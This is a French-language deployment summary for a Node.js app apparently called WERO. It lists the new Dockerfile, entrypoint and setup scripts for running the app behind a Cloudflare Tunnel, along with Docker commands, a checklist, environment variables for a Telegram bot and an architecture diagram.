# 📦 Fichiers de Déploiement Cloudflare Tunnel

## ✨ Nouveaux Fichiers Créés

### 1. **Dockerfile (Modifié)**
- **Lieu**: `backend-nodejs/Dockerfile`
- **Changement**: Ajout de `cloudflared` au build
- **Effet**: L'image Docker inclut maintenant le client Cloudflare Tunnel

### 2. **docker-entrypoint.sh** (Nouveau)
- **Lieu**: `backend-nodejs/docker-entrypoint.sh`
- **Rôle**: Script de démarrage qui :
  - Lance l'app Node.js en background
  - Détecte si `CLOUDFLARE_TOKEN` est défini
  - Lance le tunnel si le token est présent
  - Permet le fonctionnement sans tunnel (mode dev)

### 3. **docker-compose.yml** (Modifié)
- **Lieu**: `docker-compose.yml`
- **Changement**: Ajout des variables d'environnement Cloudflare
- **Variables**: `CLOUDFLARE_TOKEN`, `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`

### 4. **.env.cloudflare** (Nouveau)
- **Lieu**: `.env.cloudflare`
- **Rôle**: Template avec instructions pour obtenir le token Cloudflare
- **Usage**: Template pour créer `.env.production`

### 5. **DEPLOYMENT.md** (Nouveau)
- **Lieu**: `DEPLOYMENT.md`
- **Contenu**: Guide complet de déploiement avec Cloudflare Tunnel
- **Sections**: 
  - Créer un tunnel
  - Configurer les variables
  - Démarrer les services
  - Monitoring & logs
  - Troubleshooting

### 6. **setup-cloudflare.sh** (Nouveau)
- **Lieu**: `setup-cloudflare.sh`
- **Type**: Script bash (Linux/Mac)
- **Rôle**: Automatise entièrement le setup Cloudflare
- **Étapes**: Token → .env → Build → Lancement

### 7. **setup-cloudflare.ps1** (Nouveau)
- **Lieu**: `setup-cloudflare.ps1`
- **Type**: Script PowerShell (Windows)
- **Rôle**: Même que .sh mais pour Windows
- **Étapes**: Token → .env → Build → Lancement

### 8. **README.md** (Mis à jour)
- **Lieu**: `README.md`
- **Changement**: Ajout section Cloudflare Tunnel
- **Nouveau**: Guide rapide de déploiement

---

## 🔄 Flux de Déploiement

```
┌─────────────────────────────────────────┐
│  Option 1: Setup Automatique            │
│  ./setup-cloudflare.sh (Linux/Mac)      │
│  .\setup-cloudflare.ps1 (Windows)       │
└────────────┬────────────────────────────┘
             ↓
   ✅ Crée .env.production
   ✅ Build image Docker
   ✅ Lance services
   ✅ Teste Telegram
   ✅ Affiche URL publique

┌─────────────────────────────────────────┐
│  Option 2: Setup Manuel                 │
│  docker compose build --no-cache nodejs │
│  docker compose up -d                   │
└─────────────────────────────────────────┘
```

---

## 🚀 Commandes Principales

### Déployer sans Tunnel (Local Dev)
```bash
docker compose up -d
# App sur http://localhost:8002
```

### Déployer avec Tunnel (Publique)
```bash
# Linux/Mac
chmod +x setup-cloudflare.sh
./setup-cloudflare.sh

# Windows
.\setup-cloudflare.ps1

# Manuel
docker compose --env-file .env.production up -d
```

### Monitorer
```bash
docker compose logs nodejs -f
```

### Arrêter
```bash
docker compose down
```

---

## 📋 Checklist Déploiement

- [ ] Token Cloudflare obtenu (https://dash.cloudflare.com/tunnels)
- [ ] Telegram Bot créé (@BotFather)
- [ ] Chat ID Telegram trouvé (getUpdates API)
- [ ] .env.production créé avec tous les tokens
- [ ] Image Docker buildée (`docker compose build`)
- [ ] Services lancés (`docker compose up -d`)
- [ ] App accessible localement (http://localhost:8002)
- [ ] Tunnel dans Dashboard Cloudflare (vert/connected)
- [ ] URL publique accessible
- [ ] Test Telegram: `curl -X POST http://localhost:8002/api/test-telegram`

---

## 🔐 Variables d'Environnement

| Variable | Requis | Exemple | Lieu |
|----------|--------|---------|------|
| `TELEGRAM_BOT_TOKEN` | ✅ | `123456:ABCDefg...` | `.env` / `.env.production` |
| `TELEGRAM_CHAT_ID` | ✅ | `8176081750` | `.env` / `.env.production` |
| `CLOUDFLARE_TOKEN` | ❌* | `eyJhIjoiXXXX...` | `.env.production` |
| `NODE_ENV` | ✅ | `development` / `production` | `.env` / `.env.production` |
| `PORT` | ✅ | `3000` | `.env` / `.env.production` |

*Optionnel - nécessaire seulement pour le tunnel public

---

## 📊 Architecture Finale

```
┌──────────────────────────────────────────┐
│          Utilisateur Internet            │
└──────────────────┬───────────────────────┘
                   │
          ┌────────▼────────┐
          │  Cloudflare     │
          │  CDN + Tunnel   │
          │  (HTTPS/DDoS)   │
          └────────┬────────┘
                   │
          ┌────────▼────────────────┐
          │  Docker Host            │
          │  ┌─────────────────┐    │
          │  │  Node.js WERO   │    │
          │  │  + Cloudflared  │    │
          │  └─────────────────┘    │
          │  ┌─────────────────┐    │
          │  │  MySQL          │    │
          │  └─────────────────┘    │
          └────────────────────────┘
                   │
          ┌────────▼────────┐
          │  Telegram       │
          │  Bot API        │
          └─────────────────┘
```

---

## ✅ Status Déploiement

| Component | Status | Notes |
|-----------|--------|-------|
| Node.js App | ✅ Fonctionnel | http://localhost:8002 |
| Telegram Integration | ✅ Fonctionnel | Envoie données automatiquement |
| MySQL | ✅ Fonctionnel | Prêt pour stockage |
| Cloudflare Tunnel | ✅ Intégré | Nécessite token pour activation |
| Docker | ✅ Prêt | Build sans erreurs |
| Scripts Automatisés | ✅ Prêts | Linux/Mac/Windows |

---

**Prêt pour le déploiement public ! 🚀**

Voir [DEPLOYMENT.md](./DEPLOYMENT.md) pour instructions détaillées.
